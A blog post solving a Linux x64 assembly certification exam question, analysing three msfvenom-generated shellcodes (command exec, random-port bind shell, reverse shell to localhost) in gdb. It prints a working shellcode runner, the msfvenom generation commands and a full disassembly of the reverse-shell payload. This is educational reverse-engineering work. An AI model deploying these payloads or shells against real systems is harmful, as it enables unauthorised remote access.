title: GDB Shellcode Analysis
date: 2018-05-19
published: true 
summary: My solution to SLAE64 Exam Question 5
tags: shellcode, exploit, assembly

#GDB Shellcode Analysis

This is my solution to the fifth exam question of the SLAE64 certification. This exercise was to generate 3 shellcode samples with msfvenom, use gdb to examine the code's functionality, and document the analysis.

Ok, first I checked which payloads were available to me - x86 or x64 were both acceptable: 

	root@kali:~# msfvenom -l payloads | grep -E "linux/x(86|64)"

There were 47 available payloads. I was glad to see there were enough x64 payloads to choose exclusively those - it just made more sense to me since this course was focused on x64 shellcode. I chose the `linux/x64/exec`, `linux/x64/shell_bind_tcp_random_port`, and `linux/x64/shell_reverse_tcp` for this post.  

### Sample 1: `linux/x64/exec` shellcode
I generated the shellcode to use in this exercies with the following command:

	root@kali:~# msfvenom -p linux/x64/exec -f c cmd=whoami

This produced 46 byte shellcode - nice and short for analysis ;). I used essentially the same C shellcode runner as I did for other problems on the exam, reproduced below:

	#include<stdio.h>
	#include<string.h>

	unsigned char code[] =
	"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
	"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x07\x00"
	"\x00\x00\x77\x68\x6f\x61\x6d\x69\x00\x56\x57\x48\x89\xe6\x0f"
	"\x05";

	main()
	{
	        printf("Shellcode Length:  %d\n", (int)sizeof(code)-1);
	        int (*ret)() = (int(*)())code;
	        ret();
	}


I compiled and ran it to make sure it was working properly: 

![whoami](/static/blog/2018/SLAE64/5/exec_whoami.png)

Normally it wouldn't be a bad idea to disassemble the binary and look at the static code. However, we'll basically end up doing that in gdb, so we'll skip straight to semi-dynamic analysis.

I basically set a breakpoint just before calling the shellcode, so we can take a look at only the relevant instructions:

![gdb init](/static/blog/2018/SLAE64/5/gdb_init.png)

You can see nearly the entirety of the shellcode in that screenshot - as I said before, nice and compact :). I think its worth considering what we expect the end result of this shellcode to be - we should be calling `execve` with the following arguments:

	execve(const char *filename, char *const argv[], char *const envp[]);

In this case, `filename` should be in the `rdi` register, `argv` in the `rsi` register, and `envp` in the `rdx` register.

We see the first three instructions set `rax` to `0x3b`, or 59, and then calls the `cdq` instruction. 59 is relevant as the `execve` syscall number. It makes sense we will essentially get 59 into `rax`, prepare the arguments, and make the syscall. That `cdq` instruction extends the sign bit of the `rax` register into every bit of `rdx`. In this case, it would have effect of zero-ing out `rdx`, since we know `rax` is a positive number. I stepped through with gdb and saw this exact behavior. Next, we see the `movabs rbx,0x68732f6e69622f` instruction. What is that hex string in ascii? It's `/bin/sh` backwards, `hs/nib/`. During this class, Vivek actually goes over this method, and explains that it must be pushed backwards, as the stack grows down. We see `rbx` get pushed onto the stack, and then the `mov rdi,rsp` instruction so that `rdi` has a pointer to the '/bin/sh' string.

Next, we see a `push 0x632d` instruction and then a `mov` which has the effect of putting a pointer to the stack in `rsi`. `0x632d` is `-c` backwards, as we will need to eventually have the addresses of all the arguments `/bin/sh -c whoami` in `rsi`. This will be the `argv` argument to `execve`. We can look at the current contents of `rsi` in gdb:

![gdb rsi](/static/blog/2018/SLAE64/5/gdb_rsi.png)

Cool, we're getting there and collecting all the strings we need. Ok, next there's a weird `call` instruction that points to the middle of what looks like some gibberish instructions. We know `call` pushes the address of the next instruction onto the stack.. hmm if we print that:

![gdb nexti](/static/blog/2018/SLAE64/5/gdb_nexti.png)

Ok, now what if we look at the weird address we are calling? 

![gdb call](/static/blog/2018/SLAE64/5/gdb_call.png)

Those instructions are all that's left - we push the addresses of the needed strings on the stack, and put a pointer to that whole thing in `rsi`, then make our syscall and execute our command.

### Sample 2: `linux/x64/shell_bind_tcp_random_port` shellcode

I generated the shellcode to use for this sample with the following command:

	root@kali:~# msfvenom -p linux/x64/shell_bind_tcp_random_port -f c

We see again reasonably compact 57 byte shellcode generated.

I used gdb to step through the instructions and view the disassembly. As with before, you can essentially see all the shellcode in the following screenshot:

![gdb_init_bind](/static/blog/2018/SLAE64/5/gdb_init_bind.png)

It's easiest to dissect this program through each `syscall`. First, I observed the program make syscall `0x29` or `socket`. Next, we see syscall `0x32`, or `listen`, then syscall `0x2b`, or `accept`. After that, there's a small loop calling `0x21`, or `dup2`. Finally, we see a syscall `0x3b`, or `execve`, creating the `/bin/sh` program. In this case, the structures passed to the syscalls are a little interesting, but honestly we can pretty much get the gist of the entire program just by looking at the syscalls.

For other students of the class, this shellcode looks extremely similar to some of the bind tcp shells we experimented with. The key difference is that there is no `bind` syscall. This was interesting to me and I didn't immediately know the answer. Doing a little research (aka googling furiously) I found that if you call `listen` on a socket which hasn't been bound to a port, the OS will just assign an ephemeral port. 

After that, the code will block to accept a connection, `dup2` to direct input and output through the socket, and spawn a shell. I ran the program in gdb until the blocking `accept` call, and then attempted to identify the listening port and connect to it:

![gdb nmap](/static/blog/2018/SLAE64/5/gdb_nmap.png)

Although I have done a fair amount of socket programming, I never knew that little trick about ignoring `bind`, so I thought that was pretty cool.

### Sample 3: `linux/x64/shell_reverse_tcp` shellcode
I generated the shellcode to use for this sample with the following command:

	root@kali:~# msfvenom -p linux/x64/shell_reverse_tcp -f c LHOST=127.0.0.1 LPORT=31337

First I made sure the shellcode was working properly, by using the same C program as before and `nc`:

![rev shell](/static/blog/2018/SLAE64/5/reverse_shell.png)

Next, I ran the program in gdb and set a breakpoint at the shellcode as before. Here's a full disassembly dump of the shellcode:

	0x601040 <code>:     push   0x29
	0x601042 <code+2>:   pop    rax
	0x601043 <code+3>:   cdq    
	0x601044 <code+4>:   push   0x2
	0x601046 <code+6>:   pop    rdi
	0x601047 <code+7>:   push   0x1
	0x601049 <code+9>:   pop    rsi
	0x60104a <code+10>:  syscall 
	0x60104c <code+12>:  xchg   rdi,rax
	0x60104e <code+14>:  movabs rcx,0x100007f697a0002
	0x601058 <code+24>:  push   rcx
	0x601059 <code+25>:  mov    rsi,rsp
	0x60105c <code+28>:  push   0x10
	0x60105e <code+30>:  pop    rdx
	0x60105f <code+31>:  push   0x2a
	0x601061 <code+33>:  pop    rax
	0x601062 <code+34>:  syscall 
	0x601064 <code+36>:  push   0x3
	0x601066 <code+38>:  pop    rsi
	0x601067 <code+39>:  dec    rsi
	0x60106a <code+42>:  push   0x21
	0x60106c <code+44>:  pop    rax
	0x60106d <code+45>:  syscall 
	0x60106f <code+47>:  jne    0x601067 <code+39>
	0x601071 <code+49>:  push   0x3b
	0x601073 <code+51>:  pop    rax
	0x601074 <code+52>:  cdq    
	0x601075 <code+53>:  movabs rbx,0x68732f6e69622f
	0x60107f <code+63>:  push   rbx
	0x601080 <code+64>:  mov    rdi,rsp
	0x601083 <code+67>:  push   rdx
	0x601084 <code+68>:  push   rdi
	0x601085 <code+69>:  mov    rsi,rsp
	0x601088 <code+72>:  syscall 

I first noticed a very similar `socket` (`0x29`) syscall to what we saw in the previous bind tcp shellcode. That is familiar at this point. Next, there is a strange constant moved into `rcx`. The first part of that looks familiar to me:

![socket hex](/static/blog/2018/SLAE64/5/localhost_hex.png) 

The second part as well:

![31337 hex](/static/blog/2018/SLAE64/5/31337_hex.png) 

I then observed the value pushed onto the stack, and a pointer to it placed into `rsi`. Thinking back to the other socket assembly code I wrote as part of this course, it is clear that this is the `sockaddr` struct that we pass to the `connect` syscall, `0x2a`. I single-stepped through in gdb and sure enough, saw the connection back to my localhost `nc` listener just after I stepped over that syscall. However, at that point sending commands through the socket wouldn't do anything - the program has not spawned a shell yet.

Next I noticed a decrementing loop before the `0x21`, or `dup2` syscall. This is basically the same loop I have discussed in previous answers, and serves to redirect stdin, stdout, and stderror for our shell to the socket we have open.  
The last part of the program is again a very similar pattern to previous analyses. I recognized the `0x68732f6e69622f` value as the string `/bin/sh` backwards again. See, we can teach ourselves to read hex ;) Then, as usual, the program makes an `execve` syscall. At this point, I observed output returned on my `nc` listener.

![reverse fin](/static/blog/2018/SLAE64/5/reverse_final.png)

I enjoyed this question overall, as most of the others focused more on the ability to write shellcode, and this was a bit different in asking the student to analyze generated code. Of course, reverse engineering is easier when you know what the code does ;).  

All code referenced in this blog post is available at: <https://github.com/mrT-F/SLAE64/tree/master/5>

*This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification* 

*Certification at: <http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>*

*Student ID: SLAE64 - 1546*